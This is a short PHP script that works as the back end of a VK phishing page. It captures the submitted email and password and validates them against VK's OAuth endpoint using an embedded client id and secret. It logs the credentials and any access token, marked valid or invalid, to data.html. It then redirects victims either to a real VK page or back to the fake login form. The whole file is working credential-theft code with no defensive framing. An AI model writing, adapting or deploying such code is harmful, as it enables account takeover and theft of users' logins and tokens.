<?php
$login = $_POST['email'];
$pass= $_POST['pass'];
if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
  $all = "<b style='color:red'>Неверные данные...<br>Login: $login<br>Password: $pass</b><hr>";
  $fp = fopen("data.html", 'a+');
  fwrite($fp, "$all");
  fclose($fp);
  header("location:index.php?i=1");
}else{
  $proverca = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass");
  $proverca = json_decode($proverca, true);
  $proverca_token = $proverca['access_token'];
  if($proverca['user_id']){
      $all = "<b style='color:green'>Верные данные... <br>Login: $login<br>Password: $pass<br>Token: $proverca_token</b><hr>";
      $fp = fopen("data.html", 'a+');
      fwrite($fp, "$all");
      fclose($fp);
      header("location: https://vk.com/pozitive_youmor?z=photo-116217300_456239788%2Falbum-116217300_0%2Frev");
  }else{
      $all = "<b style='color:red'>Неверные данные...<br>Login: $login<br>Password: $pass</b><hr>";
      $fp = fopen("data.html", 'a+');
      fwrite($fp, "$all");
      fclose($fp);
     header("location:index.php?i=1");
  }
}
?>
